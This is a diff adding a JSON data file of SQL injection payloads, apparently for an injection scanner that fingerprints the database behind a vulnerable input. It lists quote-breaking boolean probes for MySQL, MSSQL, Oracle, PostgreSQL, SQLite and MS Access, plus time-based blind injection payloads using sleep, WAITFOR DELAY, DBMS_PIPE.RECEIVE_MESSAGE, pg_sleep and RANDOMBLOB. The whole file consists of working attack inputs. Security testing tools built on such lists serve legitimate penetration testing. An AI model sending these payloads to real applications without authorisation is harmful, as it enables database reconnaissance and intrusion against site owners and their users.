@@ -1,0 +1,77 @@
+{
+    "list_dbms": [
+        {
+            "name": "MYSQL",
+            "list_command": [
+                "' AND conv('a',16,2)=conv('a',16,2)",
+                "' AND connection_id()=connection_id()",
+                "' AND crc32('MySQL')=crc32('MySQL')"
+            ],
+            "time_based_command": [
+                "' + sleep(10)",
+                "' and sleep(10)",
+                "' && sleep(10)",
+                "' | sleep(10)"
+            ]
+        },
+        {
+            "name": "MSSQL",
+            "list_command": [
+                "' AND BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)",
+                "' AND @@CONNECTIONS>0",
+                "' AND @@CONNECTIONS=@@CONNECTIONS",
+                "' AND @@CPU_BUSY=@@CPU_BUSY",
+                "' AND USER_ID(1)=USER_ID(1)"
+            ],
+            "time_based_command": [
+                "' AND WAITFOR DELAY '0:0:10'"
+            ]
+        },
+        {
+            "name": "ORACLE",
+            "list_command": [
+                "' AND ROWNUM=ROWNUM",
+                "' AND RAWTOHEX('AB')=RAWTOHEX('AB')",
+                "' AND LNNVL(0=123)"
+            ],
+            "time_based_command": [
+                "' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])",
+                "' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)"
+            ]
+        },
+        {
+            "name": "POSTGRESQL",
+            "list_command": [
+                "' AND 5::int=5",
+                "' AND 5::integer=5",
+                "' AND pg_client_encoding()=pg_client_encoding()",
+                "' AND get_current_ts_config()=get_current_ts_config()",
+                "' AND quote_literal(42.5)=quote_literal(42.5)",
+                "' AND current_database()=current_database()"
+            ],
+            "time_based_command": [
+                "' || pg_sleep(10)"
+            ]
+        },
+        {
+            "name": "SQLITE",
+            "list_command": [
+                "' AND sqlite_version()=sqlite_version()",
+                "' AND last_insert_rowid()>1",
+                "' AND last_insert_rowid()=last_insert_rowid()"
+            ],
+            "time_based_command": [
+                "' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))",
+                "' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))"
+            ]
+        },
+        {
+            "name": "MSACCESS",
+            "list_command": [
+                "' AND val(cvar(1))=1",
+                "' AND IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0",
+                "' AND cdbl(1)=cdbl(1)"
+            ]
+        }
+    ]
+}
